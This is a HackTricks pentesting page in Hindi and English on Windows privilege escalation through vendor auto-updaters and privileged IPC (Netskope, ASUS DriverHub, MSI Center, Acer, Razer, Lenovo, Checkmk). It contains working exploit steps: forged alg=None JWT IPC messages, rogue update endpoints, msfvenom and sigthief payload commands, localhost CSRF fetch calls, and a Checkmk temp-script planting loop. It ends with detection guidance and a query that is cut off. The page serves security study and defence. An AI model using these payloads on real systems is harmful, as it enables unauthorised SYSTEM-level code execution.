# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (जैसे, Netskope, ASUS और MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows के local privilege escalation chains के एक वर्ग का सामान्य विवरण देता है। ये chains ऐसे enterprise endpoint agents और updaters में पाए गए हैं जो आसानी से उपलब्ध IPC surface और privileged update flow दिखाते हैं। इसका एक प्रतिनिधि उदाहरण Windows के लिए Netskope Client < R129 (CVE-2025-0309) है, जहाँ low-privileged user enrollment को attacker-controlled server की ओर मोड़ सकता है और फिर malicious MSI भेज सकता है, जिसे SYSTEM service install करती है।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

ऐसे ही उत्पादों के विरुद्ध दोबारा इस्तेमाल किए जा सकने वाले मुख्य विचार:
- Privileged service के localhost IPC का दुरुपयोग करके उसे attacker server पर re-enrollment या reconfiguration करने के लिए मजबूर करें।
- Vendor के update endpoints लागू करें, rogue Trusted Root CA भेजें और updater को malicious, “signed” package की ओर इंगित करें।
- कमज़ोर signer checks (CN allow-lists), optional digest flags और ढीली MSI properties को bypass करें।
- अगर IPC “encrypted” है, तो registry में संग्रहीत world-readable machine identifiers से key/IV निकालें।
- अगर service callers को image path/process name के आधार पर प्रतिबंधित करती है, तो allow-listed process में inject करें या किसी एक को suspended अवस्था में spawn करें और न्यूनतम thread-context patch के ज़रिए अपनी DLL bootstrap करें।

Custom local TCP services की पहचान और input boundaries की भी उतनी ही जाँच करें, भले ही उन्हें PIN या किसी अन्य application credential की ज़रूरत हो। Listener को उसके process और प्रभावी service account से जोड़ें, फिर सटीक deployed binary/version की जाँच करें और पता लगाएँ कि caller-controlled fields को fixed buffers में copy करने या child-process command बनाने से पहले उनकी length जाँची जाती है या नहीं। [Microsoft की buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) बताती है कि privileged native code में unchecked external input ख़तरनाक क्यों है। Loopback listener, hardcoded credential या केवल process name से memory corruption या SYSTEM execution साबित नहीं होता; reachability, authorization, code path और mitigations अलग-अलग शर्तें हैं। नियमित enumeration को passive रखें; live service को crash कराने वाली लंबाई के inputs न भेजें।

---
## 1) localhost IPC के ज़रिए enrollment को attacker server की ओर मोड़ना

कई agents में user-mode UI process होता है, जो localhost TCP पर JSON का इस्तेमाल करके SYSTEM service से बात करता है।

Netskope में देखा गया:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसा JWT enrollment token बनाएँ जिसके claims backend host (जैसे, AddonUrl) को नियंत्रित करते हों। alg=None का उपयोग करें, ताकि signature की ज़रूरत न पड़े।
2) अपने JWT और tenant name के साथ provisioning command invoke करने वाला IPC message भेजें:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) सेवा enrollment/config के लिए आपके rogue server से संपर्क करना शुरू करती है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट्स:
- यदि caller verification path/name-based है, तो allow-listed vendor binary से request भेजें (देखें §4)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) SYSTEM के रूप में code चलाने के लिए update channel को hijack करना

जब client आपके server से बात करने लगे, तो अपेक्षित endpoints लागू करें और उसे attacker MSI की ओर निर्देशित करें। सामान्य क्रम:

1) /v2/config/org/clientconfig → बहुत कम updater interval वाली JSON config लौटाएँ, जैसे:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate लौटाएँ। Service इसे Local Machine Trusted Root store में install करती है।
3) /v2/checkupdate → किसी malicious MSI और fake version की ओर संकेत करने वाला metadata दें।

जंगली तौर पर दिखने वाले आम checks को bypass करना:
- Signer CN allow-list: Service केवल यह जाँच सकती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है या नहीं। आपका rogue CA इसी CN वाला leaf जारी करके MSI पर sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की एक benign MSI property शामिल करें। Install के समय इसका enforcement नहीं होता।
- Optional digest enforcement: Config flag (जैसे, check_msi_digest=false) अतिरिक्त cryptographic validation को disable कर देता है।

नतीजा: SYSTEM service आपकी MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से install करती है और NT AUTHORITY\SYSTEM के रूप में arbitrary code execute करती है।<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass का सबक: अगर कोई vendor update source को cryptographically authenticate करने के बजाय कुछ “trusted” domains की allow-list बनाकर जवाब देता है, तो vendor के ऐसे redirectors या reverse proxies खोजें जिनसे आप अब भी traffic को अपनी मर्ज़ी से steer कर सकें। Netskope के मामले में, बाद की public research से पता चला कि R129-era allow-list को `rproxy.goskope.com` के ज़रिए अब भी abuse किया जा सकता था। यह proxy attacker-controlled Azure App Service content को serve करता था। Hostname allow-lists को trust boundary नहीं, बल्कि एक speed bump समझें।<sup>[[14]](#references)</sup>

---
## 3) Encrypted IPC requests forge करना (अगर मौजूद हों)

R127 से, Netskope ने IPC JSON को encryptData field में wrap करना शुरू किया, जो Base64 जैसा दिखता है। Reverse engineering से पता चला कि AES key/IV, registry values से derive होते हैं जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption को दोहरा सकते हैं और standard user से valid encrypted commands भेज सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup> सामान्य सुझाव: अगर कोई agent अचानक अपने IPC को “encrypt” करने लगे, तो HKLM में मौजूद device IDs, product GUIDs और install IDs को material के रूप में खोजें।

---
## 4) IPC caller allow-lists को bypass करना (path/name checks)

कुछ services TCP connection के PID को resolve करके और image path/name की तुलना Program Files के अंतर्गत मौजूद allow-listed vendor binaries (जैसे, stagentui.exe, bwansvc.exe, epdlp.exe) से करके peer को authenticate करने की कोशिश करती हैं।

Bypass के दो व्यावहारिक तरीके:
- किसी allow-listed process (जैसे, nsdiag.exe) में DLL injection करें और उसी के अंदर से IPC proxy करें।
- किसी allow-listed binary को suspended स्थिति में spawn करें और driver-enforced tamper rules को संतुष्ट करने के लिए CreateRemoteThread के बिना अपनी proxy DLL bootstrap करें (§5 देखें)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection के अनुकूल injection: suspended process + NtContinue patch

Products अक्सर handles से protected processes के लिए खतरनाक rights हटाने हेतु minifilter/OB callbacks driver (जैसे, Stadrv) के साथ आते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: अधिकारों को THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

इन constraints का पालन करने वाला एक भरोसेमंद user-mode loader:
1) CREATE_SUSPENDED के साथ किसी vendor binary का CreateProcess करें।
2) वे handles प्राप्त करें जिनकी आपको अभी भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और THREAD_GET_CONTEXT/THREAD_SET_CONTEXT वाला thread handle (या अगर आप किसी ज्ञात RIP पर code patch करते हैं, तो केवल THREAD_RESUME)।
3) ntdll!NtContinue (या किसी अन्य शुरुआती, निश्चित रूप से mapped thunk) को एक छोटे stub से overwrite करें, जो आपकी DLL path पर LoadLibraryW call करे और फिर वापस jump करे।
4) अपने stub को process के अंदर trigger करने और अपनी DLL load करने के लिए ResumeThread करें।

क्योंकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का इस्तेमाल नहीं किया (आपने उसे खुद create किया था), इसलिए driver की policy का पालन होता है।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) व्यावहारिक tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing और ज़रूरी endpoints को serve करने की प्रक्रिया automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।<sup>[[3]](#references)</sup>
- UpSkope एक custom IPC client है, जो arbitrary (वैकल्पिक रूप से AES-encrypted) IPC messages तैयार करता है और allow-listed binary से शुरुआत करने के लिए suspended-process injection शामिल करता है।<sup>[[4]](#references)</sup>

## 7) अज्ञात updater/IPC surfaces के लिए तेज़ triage workflow

किसी नए endpoint agent या motherboard “helper” suite की जाँच करते समय, एक quick workflow आम तौर पर यह तय करने के लिए काफ़ी होता है कि क्या आप एक promising privesc target देख रहे हैं:<sup>[[6]](#references)</sup>

1) Loopback listeners enumerate करें और उन्हें vendor processes से map करें:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) संभावित named pipes की सूची बनाएं:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को निकालें:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) पहले user-mode client से endpoint names, JSON keys और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) वास्तविक trust predicate खोजें, न कि केवल उस code path को जो अंततः process लॉन्च करता है:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

प्राथमिकता देने योग्य patterns:
- `CryptQueryObject`/certificate parsing के साथ `WinVerifyTrust` का उपयोग न होना आमतौर पर यह दर्शाता है कि “certificate मौजूद है” को “certificate trusted है” मान लिया गया, जिससे certificate cloning या अन्य fake-signer tricks संभव होते हैं।
- `Origin`, `Referer`, download URLs, process names या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` आमतौर पर attacker-controlled मिलते-जुलते domains से exploit किया जा सकता है।
- अगर low-privileged GUI तय करता है कि “file trusted है” और SYSTEM broker सिर्फ़ उस नतीजे का इस्तेमाल करता है, तो client-side DLL/JS को patch या reimplement करके अक्सर पूरी boundary bypass की जा सकती है (Razer-style split validation)।
- अगर broker payload को `%TEMP%`/`C:\Windows\Temp` में copy करता है और फिर उसी path से उसे validate या schedule करता है, तो तुरंत TOCTOU replacement windows और ऐसे sibling plugin modules जाँचें जो कमज़ोर checks वाले alternate `ExecuteTask()` wrappers उपलब्ध कराते हैं।<sup>[[6]](#references)</sup>

Named-pipe-heavy targets के लिए, protocol को गहराई से reverse करना शुरू करने से पहले कमज़ोर DACLs और remotely reachable pipes पहचानने का PipeViewer एक तेज़ तरीका है।<sup>[[11]](#references)</sup>

अगर target callers को सिर्फ़ PID, image path या process name के आधार पर authenticate करता है, तो इसे boundary के बजाय speed bump मानें: legitimate client में inject करना या allow-listed process से connection बनाना अक्सर server के checks को संतुष्ट करने के लिए काफ़ी होता है। खास तौर पर named pipes के लिए, [client impersonation और pipe abuse पर यह page](named-pipe-client-impersonation.md) इस primitive को अधिक विस्तार से समझाता है।

Privileged **cleanup या restore broker** के लिए, pipe ACL के साथ path trust boundary भी जाँचें। कम privilege वाला caller shared directory में restore destination चुनने या staged backup artifact का नाम बदलने में सक्षम हो सकता है, भले ही service executable और उसकी install directory सुरक्षित हों। अलग-अलग पुष्टि करें कि caller restore command तक पहुँच सकता है, exact staged input या filename को बदल सकता है, broker higher identity के तहत चलता है, और उसका restore operation चुने गए protected path पर वास्तव में लिखता है। Writable staging directory या readable pipe अकेले arbitrary privileged write साबित नहीं करते; destination mapping और service behavior की code review या नियंत्रित testing ज़रूरी है। Passive enumeration के दौरान कोई अज्ञात cleanup command न चलाएँ, क्योंकि वह user files delete कर सकती है।

---
## 8) केवल vendor signatures से authenticated modular add-in brokers (Lenovo Vantage pattern)

शिकार करने लायक एक नया variant **signed-client RPC broker** है: Lenovo-signed low-privileged desktop process किसी SYSTEM service से बात करता है, और service `%ProgramData%` के अंतर्गत XML-described add-ins के set में JSON commands route करती है। किसी भी accepted signed client **के अंदर** code execution मिल जाने के बाद, हर `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।<sup>[[15]](#references)</sup>

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर इसलिए भरोसा करना क्योंकि उस पर vendor के signatures हैं**: researchers ने writable directory में Lenovo-signed EXE copy करके और DLL side-load (`profapi.dll`) को सफल बनाकर authenticated context हासिल किया, जिससे पहले से trusted client के अंदर arbitrary code चलाया जा सका।
- **Manifest-driven attack surface discovery**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के अंतर्गत घोषित होते हैं; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए उन manifests को enumerate करने से अक्सर broker को ही reverse करने की तुलना में असली privileged verbs जल्दी पता चलते हैं।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुँचने के बाद, public research में update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse, और substring-based registry path checks मिले, जिनसे intended hive के बाहर writes संभव हुए।

Target पर उपयोगी recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Practical takeaway: जब भी कोई helper suite ऐसा broker expose करे जो पहले **caller process** को authenticate करता हो और उसके बाद ही दर्जनों plugin/add-in commands dispatch करता हो, तो front-door trust check को bypass करने के बाद रुकें नहीं। Manifest/contract table dump करें और हर high-privilege verb को अलग-अलग fuzz करें; authenticated channel में अक्सर कई second-stage bugs छिपे होते हैं।

---
## 1) Privileged HTTP APIs के विरुद्ध Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 पर एक user-mode HTTP service (ADU.exe) उपलब्ध कराता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करता है। Origin filter, Origin header और `/asus/v1.0/*` से exposed download URLs पर बस `string_contains(".asus.com")` लागू करता है। इसलिए `https://driverhub.asus.com.attacker.tld` जैसे attacker-controlled host इस check को पास कर लेते हैं और JavaScript से state-changing requests भेज सकते हैं।<sup>[[6]](#references)</sup> अन्य bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) ऐसा domain register करें जिसमें `.asus.com` शामिल हो और वहाँ malicious webpage host करें।
2) `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे `Reboot`, `UpdateApp`) को call करने के लिए `fetch` या XHR का उपयोग करें।
3) Handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS में नीचे दिया गया schema दिखता है।

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

नीचे दिखाया गया PowerShell CLI भी तब सफल होता है जब Origin header को trusted value पर spoof किया जाता है:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

इसलिए attacker site पर किसी भी browser visit से 1-click (या `onload` के ज़रिए 0-click) local CSRF होता है, जो SYSTEM helper को चलाता है।

---
## 2) असुरक्षित code-signing verification और certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में दी गई arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation में वही substring logic इस्तेमाल होता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार किया जाता है। Download के बाद, ADU.exe केवल यह जाँचता है कि PE में signature है और Subject string ASUS से मेल खाती है—यह `WinVerifyTrust` या chain validation नहीं करता।

इस flow का weaponize करने के लिए:
1) एक payload बनाएँ (उदाहरण के लिए, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) इसमें ASUS के signer को clone करें (उदाहरण के लिए, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` जैसे दिखने वाले domain पर host करें और ऊपर बताए गए browser CSRF के ज़रिए UpdateApp को trigger करें।

क्योंकि Origin और URL filters दोनों substring-based हैं और signer check केवल strings की तुलना करता है, DriverHub attacker binary को अपने elevated context में डाउनलोड करके execute करता है।<sup>[[6]](#references)</sup>

---
## 1) updater के copy/execute paths के भीतर TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol expose करती है, जिसमें हर frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) में `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` मौजूद है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के ज़रिए signature verify करता है (certificate subject का “MICRO-STAR INTERNATIONAL CO., LTD.” से मेल खाना और `WinVerifyTrust` का सफल होना ज़रूरी है)।
3) एक scheduled task बनाता है, जो attacker-controlled arguments के साथ temp file को SYSTEM के रूप में चलाता है।

Verification और `ExecuteTask()` के बीच copied file lock नहीं होती। Attacker यह कर सकता है:
- Frame A भेजे, जिसमें एक legitimate MSI-signed binary हो (इससे signature check पास होना और task queue होना सुनिश्चित होता है)।
- इसे बार-बार भेजे गए Frame B messages के साथ race करे, जो malicious payload की ओर इंगित करते हैं और verification पूरी होने के तुरंत बाद `MSI Center SDK.exe` को overwrite करते हैं।

Scheduler के चलने पर, original file validate होने के बावजूद वह overwritten payload को SYSTEM के रूप में execute करता है। भरोसेमंद exploitation के लिए दो goroutines/threads इस्तेमाल करके CMD_AutoUpdateSDK को तब तक spam किया जाता है, जब तक TOCTOU window जीत न ली जाए।<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC और impersonation का दुरुपयोग (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा load किए गए हर plugin/DLL को एक Component ID मिलता है, जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` में stored होता है। Frame के पहले 4 bytes उस component को चुनते हैं, जिससे attackers arbitrary modules को commands route कर सकते हैं।
- Plugins अपने task runners define कर सकते हैं। `Support\API_Support.dll` में `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` मौजूद है और यह सीधे `API_Support.EX_Task::ExecuteTask()` call करता है—**बिना किसी signature validation के**। कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` पर point करके निश्चित रूप से SYSTEM execution पा सकता है।
- Wireshark से loopback sniff करने या dnSpy में .NET binaries instrument करने से Component ↔ command mapping जल्दी सामने आ जाती है; फिर custom Go/ Python clients frames को replay कर सकते हैं।<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes और impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` expose करता है, और इसका discretionary ACL remote clients (उदाहरण के लिए, `\\TARGET\pipe\treadstone_service_LightMode`) को अनुमति देता है। File path के साथ command ID `7` भेजने पर service का process-spawning routine invoke होता है।
- Client library args के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` के साथ dynamic instrumentation (instrumentation के सुझावों के लिए [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) देखें) से पता चलता है कि native handler `CreateProcessAsUser` call करने से पहले इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch चलती है, जो पूरा SYSTEM token बनाए रखती है और high-integrity SID (`S-1-16-12288`) सेट करती है। इसलिए spawned binary unrestricted SYSTEM के रूप में चलती है—स्थानीय और cross-machine, दोनों स्थितियों में।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ इस्तेमाल करके lab VMs पर भी ACC install किया जा सकता है और vendor hardware के बिना pipe को आज़माया जा सकता है।<sup>[[6]](#references)</sup>

ये IPC bugs बताते हैं कि localhost services को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) लागू करना चाहिए, और हर module के “run arbitrary binary” helper में एकसमान signer verifications का इस्तेमाल होना चाहिए।

---
## 3) कमज़ोर user-mode validation वाले COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 ने इस परिवार में एक और उपयोगी pattern जोड़ा: कम privilege वाला user COM helper से `RzUtility.Elevator` के ज़रिए process launch करने का अनुरोध कर सकता है, जबकि trust का निर्णय privileged boundary के भीतर मज़बूती से लागू करने के बजाय user-mode DLL (`simple_service.dll`) को सौंपा गया है।

देखा गया exploitation path:
- COM object `RzUtility.Elevator` का instance बनाएँ।
- elevated launch का अनुरोध करने के लिए `LaunchProcessNoWait(<path>, "", 1)` call करें।
- सार्वजनिक PoC में, अनुरोध भेजने से पहले `simple_service.dll` के अंदर PE-signature gate को patch out कर दिया जाता है, जिससे attacker की चुनी हुई arbitrary executable launch हो सकती है।<sup>[[6]](#references)[[10]](#references)</sup>

न्यूनतम PowerShell invocation:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

General takeaway: “helper” suites को reverse करते समय केवल localhost TCP या named pipes तक सीमित न रहें। `Elevator`, `Launcher`, `Updater` या `Utility` जैसे नामों वाली COM classes की जाँच करें, फिर सत्यापित करें कि privileged service वास्तव में target binary को स्वयं validate करती है या केवल patch किए जा सकने वाले user-mode client DLL द्वारा निकाले गए नतीजे पर भरोसा करती है। यह pattern Razer से आगे भी लागू होता है: ऐसा कोई भी split design, जिसमें high-privilege broker low-privilege side से allow/deny decision लेता है, privesc surface हो सकता है।


---
## MSI repair के दौरान predictable temp script execution (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अब भी privileged actions को लागू करने के लिए `C:\Windows\Temp` में एक temporary `.cmd` लिखते हैं और उसे `SYSTEM` के रूप में execute करते हैं। यदि filename predictable हो और service पहले से मौजूद files को सुरक्षित रूप से दोबारा न बनाए, तो low-privileged user आने वाली temp file पहले से **read-only** बना सकता है और privileged process से अपनी नियंत्रित सामग्री execute करवा सकता है, न कि उसकी अपनी script।

Vulnerable Checkmk Agent builds में देखा गया:
- temp pattern: `cmk_all_<PID>_1.cmd`
- प्रभावित branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

व्यावहारिक workflow:
1. मौजूदा process IDs या running agent PID से एक वास्तविक PID range का अनुमान लगाएँ।
2. एक छोटा **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection का उपयोग करें; batch files के लिए UTF-16 PowerShell output से बचें)।
3. candidate range में `C:\Windows\Temp\cmk_all_<PID>_1.cmd` फैलाएँ और हर file को read-only बनाएँ।
4. cached MSI का repair trigger करें, ताकि privileged service temp script को फिर से बनाने की कोशिश करे और उसके बाद उसे execute करे।<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

यदि vulnerable product Windows Installer के साथ install किया गया है, तो repair trigger करने से पहले `C:\Windows\Installer` में मौजूद random-looking cached MSI को उसके product name से map करें:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta` उपयोगी है जब non-interactive WinRM shell से `msiexec /fa` विफल हो जाए और आपको यह समझना हो कि कोई मौजूदा desktop/disconnected session repair को सही ढंग से trigger कर सकता है या नहीं।<sup>[[7]](#references)</sup>
- यह pattern अन्य endpoint agents और updaters पर भी लागू होता है, जो **world-writable locations में temp scripts रखते हैं और बाद में उन्हें SYSTEM के रूप में execute करते हैं**। पूर्वानुमेय नामों, exclusive create semantics की कमी, और ऐसे repair/update flows की जाँच करें जिन्हें on demand trigger किया जा सकता है।

### Interactive installer repair और privileged console

PDF24 Creator 11.15.1 MSI-repair के एक अलग जोखिम को दर्शाता है: इसका printer-install custom action repair के दौरान SYSTEM अधिकारों के साथ एक दिखाई देने वाला console शुरू कर सकता है। विक्रेता ने इस व्यवहार को ठीक करने के लिए 11.15.2 में MSI installer बदला। किसी पुराने product version को केवल triage lead मानें। जाँचें कि MSI package registered या reachable है या नहीं, क्या यह user repair शुरू कर सकता है, क्या vulnerable custom action और log-file delay मौजूद हैं, और क्या interactive desktop console दिखा सकता है। रिपोर्ट की गई देरी में `faxPrnInst.log` पर oplock का इस्तेमाल हुआ था; केवल सामान्य file writability ही access की एकमात्र शर्त नहीं थी। Non-interactive shell, inaccessible package या patched installer इस chain को तोड़ सकता है। यह समस्या `AlwaysInstallElevated` पर निर्भर नहीं करती और predictable temporary script को बदलने से अलग है।

---
## कमजोर updater validation के ज़रिए remote supply-chain hijack (WinGUp / Notepad++)

जून 2025 और दिसंबर 2025 के बीच, Notepad++ update flow के पीछे की hosting infrastructure से समझौता करने वाले हमलावरों ने चुनिंदा victims को दुर्भावनापूर्ण manifests भेजे। पुराने WinGUp-आधारित updaters update की authenticity को पूरी तरह verify नहीं करते थे, इसलिए एक hostile XML response clients को attacker-controlled URLs पर redirect कर सकता था। चूँकि client ने HTTPS content स्वीकार करते समय trusted certificate chain और downloaded installer पर valid PE signature—दोनों को अनिवार्य नहीं किया, victims ने trojanized NSIS `update.exe` fetch और execute किया।<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (किसी local exploit की आवश्यकता नहीं):
1. **Infrastructure interception**: CDN/hosting से समझौता करें और update checks के जवाब में attacker metadata दें, जो किसी malicious download URL की ओर इशारा करता हो।
2. **Trojanized NSIS**: installer एक payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
   - **अपना signed binary लाएँ + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसके search path में malicious `log.dll` रखें। Signed binary चलने पर Windows `log.dll` को sideload करता है, जो Chrysalis backdoor को decrypt करके reflectively load करता है (static detection में बाधा डालने के लिए Warbird-protected + API hashing)।
   - **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है, जो shellcode inject करने और Cobalt Strike Beacon stage करने के लिए Win32 APIs (जैसे, `EnumWindowStationsW`) का उपयोग करता है।<sup>[[12]](#references)</sup>

किसी भी auto-updater के लिए hardening/detection संबंधी सुझाव:
- Downloaded installer के लिए **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को अस्वीकार करें) और update manifest पर स्वयं signature करें (जैसे, XMLDSig)। जब तक validation न हो, manifest-controlled redirects को block करें।
- **BYO signed binary sideloading** को download के बाद detection pivot मानें: जब signed vendor EXE अपने canonical install path के बाहर से DLL name load करे (जैसे, Bitdefender का Temp/Downloads से `log.dll` load करना), और जब updater temp से non-vendor signatures वाले installers drop/execute करे, तो alert करें।
- इस chain में देखे गए **malware-specific artifacts** की निगरानी करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में असामान्य `gup.exe` writes, और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और उसके बाद के versions में WinGUp को मजबूत किया: अब लौटाया गया XML signed है (XMLDSig), और नए builds केवल transport पर भरोसा करने के बजाय downloaded installer के लिए certificate + signature verification लागू करते हैं।<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE से <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
